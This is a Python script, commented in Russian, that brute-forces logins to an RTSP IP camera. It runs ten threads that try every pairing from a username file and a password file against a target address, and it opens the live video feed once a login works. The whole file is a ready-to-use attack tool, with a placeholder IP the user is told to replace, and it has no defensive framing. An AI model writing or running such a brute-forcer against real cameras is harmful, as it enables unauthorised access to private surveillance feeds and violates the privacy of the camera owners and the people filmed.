import cv2
from concurrent.futures import ThreadPoolExecutor

successful_login = None
cap = None

def attempt_login(ip_address, username, password):
    global successful_login, cap
    if successful_login:
        print(f"Успешный вход уже найден: {successful_login}. Пропускаем {username}:{password}.")
        return
    
    rtsp_url = f"rtsp://{username}:{password}@{ip_address}"
    print(f"Пытаемся подключиться к {rtsp_url}...")

    cap = cv2.VideoCapture(rtsp_url)

    cap.set(cv2.CAP_PROP_TIMEOUT, 1000)

    if cap.isOpened():
        successful_login = f"Успешно подключено с: {username}:{password}"
        print(successful_login)
        
        while successful_login:
            ret, frame = cap.read()
            if not ret:
                print("Не удалось получить кадр. Завершение потока.")
                break
            
            cv2.imshow('Stream', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                print("Выход из обработки видео по запросу.")
                break
        
        cap.release()
        cv2.destroyAllWindows()
        print("Поток закрыт и окна OpenCV уничтожены.")

    else:
        print(f"Не удалось открыть поток с {username}:{password}.")
        cap.release()

def main():
    ip_address = "192.168.1.100"  # замените на ваш ip (RTSP)
    login_file = "logins.txt"  # файл с логинами
    password_file = "passwords.txt"  # файл с паролями
    
    print("Чтение логинов и паролей из файлов...")
    with open(login_file, 'r') as lf:
        logins = lf.read().splitlines()
    with open(password_file, 'r') as pf:
        passwords = pf.read().splitlines()

    print(f"Найдено логинов: {len(logins)}, паролей: {len(passwords)}.")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for login in logins:
            for password in passwords:
                futures.append(executor.submit(attempt_login, ip_address, login, password))

        for future in futures:
            future.result()

    if not successful_login:
        print("Все попытки входа завершились неудачей.")

if __name__ == "__main__":
    main()
